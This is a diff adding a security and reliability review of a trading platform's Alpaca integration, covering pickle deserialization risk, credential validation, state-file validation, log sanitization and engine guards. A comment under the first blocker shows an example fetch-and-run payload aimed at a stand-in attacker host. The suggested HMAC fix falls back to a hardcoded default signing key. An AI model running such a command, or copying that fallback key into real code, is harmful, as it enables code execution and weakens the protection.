@@ -408,6 +408,302 @@ Bobby archived `platform_orchestrator.py` at 04:44, then restored it at 05:30, t
 
 ---
 
+## LIVE TRADING BLOCKERS — DETAILED BREAKDOWN
+
+### BLOCKER 1: Unsafe Model Deserialization (model_store.py:77)
+
+**The Risk:** `joblib.load()` uses Python's pickle protocol under the hood. A malicious `.joblib` file placed in `data/models/` can execute **arbitrary Python code** on load — remote code execution (RCE). This is the single most dangerous line in the entire codebase.
+
+```python
+# Current (DANGEROUS):
+model = joblib.load(latest)  # Line 77 — loads ANY pickle payload
+
+# An attacker who gains write access to data/models/ can craft:
+# malicious.joblib → os.system("curl attacker.com/steal | bash")
+```
+
+**The Fix (~30 min):**
+1. Compute HMAC-SHA256 hash at save time, store alongside the `.joblib` file
+2. Verify hash before every `joblib.load()` call
+3. Add path validation: reject any `name` containing `..` or `/` to prevent path traversal
+4. Add a whitelist of allowed model class types after deserialization
+
+```python
+# Safe pattern:
+import hmac, hashlib
+SIGNING_KEY = os.environ.get("MODEL_SIGNING_KEY", "metadron-dev-key")
+
+def save_sklearn(self, name, model, metadata=None):
+    # ... existing save logic ...
+    joblib.dump(model, model_path)
+    sig = hmac.new(SIGNING_KEY.encode(), model_path.read_bytes(), hashlib.sha256).hexdigest()
+    sig_path.write_text(sig)
+
+def load_sklearn(self, name):
+    # Validate name
+    if ".." in name or "/" in name:
+        raise ValueError(f"Invalid model name: {name}")
+    # Verify signature before loading
+    expected = sig_path.read_text().strip()
+    actual = hmac.new(SIGNING_KEY.encode(), latest.read_bytes(), hashlib.sha256).hexdigest()
+    if not hmac.compare_digest(expected, actual):
+        raise SecurityError(f"Model file tampered: {latest}")
+    model = joblib.load(latest)
+```
+
+---
+
+### BLOCKER 2: API Credential Silent Failure (alpaca_broker.py:161-162)
+
+**The Risk:** If `ALPACA_API_KEY` or `ALPACA_SECRET_KEY` are missing from `.env`, the code defaults to empty strings. The broker initializes, the `ExecutionEngine` reports "AlpacaBroker ready", but every single trade will fail at runtime with cryptic Alpaca API 401 errors. Worse — the fallback silently drops to PaperBroker, so the system *thinks* it's trading live but is actually paper trading.
+
+```python
+# Current (SILENT FAILURE):
+self.api_key = api_key or os.environ.get("ALPACA_API_KEY", "")      # "" if missing
+self.secret_key = secret_key or os.environ.get("ALPACA_SECRET_KEY", "")  # "" if missing
+# No validation — TradingClient gets empty creds, fails later
+```
+
+**The Risk Chain:**
+1. `.env` file missing or incomplete after deployment
+2. AlpacaBroker inits with empty creds
+3. First trade attempt → Alpaca 401 → exception caught
+4. ExecutionEngine catches it, falls back to PaperBroker
+5. **You think you're live trading, but you're paper trading**
+6. End of day: zero real fills, zero P&L, you've lost a full trading day
+
+**The Fix (~20 min):**
+```python
+def __init__(self, api_key=None, secret_key=None, paper=True, ...):
+    self.api_key = api_key or os.environ.get("ALPACA_API_KEY", "")
+    self.secret_key = secret_key or os.environ.get("ALPACA_SECRET_KEY", "")
+
+    # FAIL FAST — never silently degrade
+    if not self.api_key or not self.secret_key:
+        raise ValueError(
+            "ALPACA_API_KEY and ALPACA_SECRET_KEY required. "
+            "Set in .env or pass directly. "
+            "For paper trading, use PaperBroker explicitly."
+        )
+
+    # Validate credentials with a lightweight account call
+    try:
+        self.trading_client = TradingClient(self.api_key, self.secret_key, paper=paper)
+        acct = self.trading_client.get_account()
+        logger.info("Alpaca connected: account %s, equity $%s", acct.id, acct.equity)
+    except AlpacaAPIError as e:
+        raise ConnectionError(f"Alpaca credential validation failed: {e}") from e
+```
+
+Also fix the ExecutionEngine fallback to **log at ERROR level** (not warning) and **require explicit opt-in** to paper fallback:
+```python
+# execution_engine.py — don't silently fall back
+if broker_type == "alpaca":
+    self.broker = AlpacaBroker(...)  # Let it raise if creds bad
+    # No silent PaperBroker fallback for live mode
+```
+
+---
+
+### BLOCKER 3: Paper Broker State Corruption (paper_broker.py:902-926)
+
+**The Risk:** On startup, `_load_state()` reads a JSON file and directly assigns values to `self.state` with zero validation. A corrupted file (disk error, partial write, manual edit) can set `cash` to negative, `nav` to NaN, or inject phantom positions that break every downstream calculation.
+
+```python
+# Current (NO VALIDATION):
+state = json.loads(self._state_file.read_text())
+self.state.cash = state.get("cash", self.state.cash)       # Could be -999999
+self.state.nav = state.get("nav", self.state.nav)           # Could be NaN
+for ticker, pdata in state.get("positions", {}).items():
+    self.state.positions[ticker] = Position(                 # No schema check
+        ticker=ticker,
+        quantity=pdata["quantity"],                           # Could be 0 or negative
+        avg_price=pdata["avg_price"],                        # Could be 0
+        ...
+    )
+```
+
+**Failure Scenarios:**
+- Power loss during `_save_state()` → half-written JSON → `json.loads` raises → all state lost
+- Manual debug edit introduces typo → `"cash": "100000"` (string not float) → math breaks
+- Position quantity becomes 0 → division by zero in P&L calculations downstream
+
+**The Fix (~40 min):**
+```python
+# 1. Atomic writes (prevents corruption on crash)
+def _save_state(self):
+    tmp = self._state_file.with_suffix('.tmp')
+    tmp.write_text(json.dumps(state, indent=2, default=str))
+    tmp.rename(self._state_file)  # Atomic on POSIX
+
+# 2. Schema validation on load
+def _load_state(self):
+    state = json.loads(self._state_file.read_text())
+
+    # Validate scalars
+    cash = float(state.get("cash", self._initial_cash))
+    if cash < 0 or math.isnan(cash):
+        logger.error("Corrupt state: cash=%s, resetting to initial", cash)
+        return  # Don't apply corrupt state
+
+    nav = float(state.get("nav", cash))
+    if nav < 0 or math.isnan(nav):
+        logger.error("Corrupt state: nav=%s, resetting", nav)
+        return
+
+    # Validate positions
+    for ticker, pdata in state.get("positions", {}).items():
+        qty = int(pdata.get("quantity", 0))
+        if qty <= 0:
+            continue  # Skip invalid positions
+        price = float(pdata.get("avg_price", 0))
+        if price <= 0:
+            continue
+        # ... apply validated position
+```
+
+---
+
+### BLOCKER 4: Exception Logging May Leak Credentials (alpaca_broker.py:265-270)
+
+**The Risk:** Alpaca API error responses can include request headers containing the API key. Bobby's exception handlers log the full error object. In production, if logs are shipped to a centralized system (ELK, Datadog, CloudWatch), credentials could end up in plaintext in searchable logs.
+
+**The Fix (~15 min):**
+```python
+# Sanitize before logging
+except AlpacaAPIError as e:
+    # Never log full exception — may contain auth headers
+    logger.error("Alpaca API error: status=%s, code=%s",
+                 getattr(e, 'status_code', 'unknown'),
+                 getattr(e, 'code', 'unknown'))
+```
+
+---
+
+### BLOCKER 5: Platform Orchestrator Calls None Engines (platform_orchestrator.py)
+
+**The Risk:** Bobby imports 30+ engine modules with try/except and sets them to `None` on failure. But the `daily_open_routine()` calls them **without checking if they're None first**. If any import fails (missing dependency on deploy), you get `TypeError: 'NoneType' is not callable` mid-pipeline, which can halt the entire trading day.
+
+**The Fix (~30 min):**
+Add guards before every engine call:
+```python
+# Before each engine step:
+if MacroEngine is not None:
+    macro = MacroEngine()
+    macro_result = macro.run()
+else:
+    logger.warning("MacroEngine unavailable — using defaults")
+    macro_result = default_macro_result()
+```
+
+---
+
+## FIX TIME ESTIMATES
+
+| Fix | Time | Severity |
+|-----|------|----------|
+| Model store HMAC signing | 30 min | CRITICAL |
+| Alpaca credential validation | 20 min | CRITICAL |
+| Paper broker atomic writes + validation | 40 min | HIGH |
+| Log sanitization | 15 min | HIGH |
+| Orchestrator None guards | 30 min | HIGH |
+| Testing all fixes | 15 min | - |
+| **TOTAL** | **~2.5 hours** | |
+
+---
+
+## WHAT WOULD MAKE BOBBY'S WORK A* EXCEPTIONAL
+
+Bobby delivered **strong B+ work** — productive, fast, architecturally sound. Here's the gap to A*:
+
+### 1. Circuit Breaker Pattern (missing entirely)
+
+No engine in the system has a circuit breaker. If Alpaca's API degrades (slow 500s), the retry loop blocks the entire heartbeat for up to 30+ seconds per order. In a 2-minute cadence scanning 1,044 securities, one degraded API call can cascade into missed signals across the entire universe.
+
+**A* would include:**
+```python
+class CircuitBreaker:
+    """Trip after N consecutive failures, auto-reset after cooldown."""
+    def __init__(self, failure_threshold=5, cooldown_sec=60):
+        self.failures = 0
+        self.state = "CLOSED"  # CLOSED → OPEN → HALF_OPEN
+        self.last_failure = None
+```
+
+### 2. Correlation-Adjusted Portfolio VaR (monte_carlo_risk.py)
+
+Bobby's MC risk engine computes per-ticker VaR independently, then sums them for portfolio risk. This **ignores diversification benefit**. A 20-stock portfolio with 0.3 avg correlation has ~40% less risk than sum-of-parts. Without this, the risk engine will systematically overestimate risk, causing the system to under-allocate (leaving alpha on the table).
+
+**A* would include:**
+- Cholesky decomposition for correlated simulation paths
+- Copula-based tail dependency (not just linear correlation)
+- Dynamic correlation regime detection (correlations spike in crashes)
+
+### 3. Signal Validation Layer (doesn't exist)
+
+There is no validation anywhere that signals are sane before they flow into DecisionMatrix. A NaN from one engine propagates through the entire ensemble, corrupting the final score.
+
+**A* would include:**
+```python
+class SignalValidator:
+    """Gate between engines and DecisionMatrix."""
+    def validate(self, signal):
+        assert not math.isnan(signal.score), f"NaN from {signal.source}"
+        assert -1.0 <= signal.score <= 1.0, f"Out of range: {signal.score}"
+        assert signal.timestamp > datetime.now() - timedelta(minutes=5), "Stale signal"
+```
+
+### 4. Idempotent Order Submission
+
+Bobby's AlpacaBroker has no deduplication. If the heartbeat loop fires twice quickly (race condition), the same signal can generate two identical orders. Alpaca will happily fill both.
+
+**A* would include:**
+- Client-side order ID generation (deterministic hash of signal + timestamp + ticker)
+- Idempotency key passed to Alpaca API
+- Order dedup cache with TTL
+
+### 5. Structured Logging + Observability
+
+Bobby uses `logging.getLogger()` throughout — fine for development, insufficient for production. No structured fields, no trace IDs, no performance metrics.
+
+**A* would include:**
+- JSON structured logging (parseable by ELK/Datadog)
+- Request trace IDs that follow a signal from MacroEngine → DecisionMatrix → Alpaca
+- Timing metrics on every pipeline stage (Bobby has some via `PerformanceTracker` but it's not wired to export)
+- Alerting thresholds: "if heartbeat > 90s, alert"
+
+### 6. Graceful Shutdown + State Checkpointing
+
+If the process gets killed mid-pipeline (OOM, deploy, crash), there's no cleanup. Pending orders are orphaned, paper broker state may be half-written, learning loop data is lost.
+
+**A* would include:**
+- Signal handlers (SIGTERM, SIGINT) that drain pending orders
+- Checkpoint after each pipeline stage (resume from last checkpoint on restart)
+- Order reconciliation on startup (sync with Alpaca's actual fills)
+
+### 7. The Orchestrator Flip-Flop
+
+Bobby archived `platform_orchestrator.py` in commit `69e3a6bd`, then restored it in `f9a37afe`, then fully wired it in `b2c580ab`. This back-and-forth suggests architectural uncertainty about whether the orchestrator is the entry point or dead code. **A* work resolves this cleanly** — one entry point, one pipeline, documented in CLAUDE.md with a decision record for why.
+
+---
+
+## B+ TO A* COMPARISON
+
+| Category | Bobby's Current | A* Standard |
+|----------|----------------|-------------|
+| Code volume | 4,957 lines in 24hrs | Same — output is excellent |
+| Test coverage | 153/153 green | + integration tests with mocked Alpaca |
+| Security | 3 HIGH issues | Zero HIGH, signed artifacts |
+| Resilience | Retry + fallback | + circuit breaker + graceful shutdown |
+| Observability | Basic logging | Structured logging + trace IDs + metrics |
+| Risk math | Per-ticker VaR | Correlation-adjusted portfolio VaR |
+| Signal integrity | Trust all inputs | Validation layer at every boundary |
+| Idempotency | None | Deduped orders + reconciliation |
+
+Bobby built the racecar. These fixes put the seatbelts and roll cage on it.
+
+---
+
 ## OVERALL ASSESSMENT
 
 Bobby's 24-hour session was **highly productive** — 20 commits delivering a complete Alpaca broker integration (1,123 lines), two new simulation engines (796 lines), model persistence, risk gate fixes, and full orchestrator wiring. The code quality is **solid B+** overall with good architecture patterns (graceful degradation, interface consistency, comprehensive error handling).
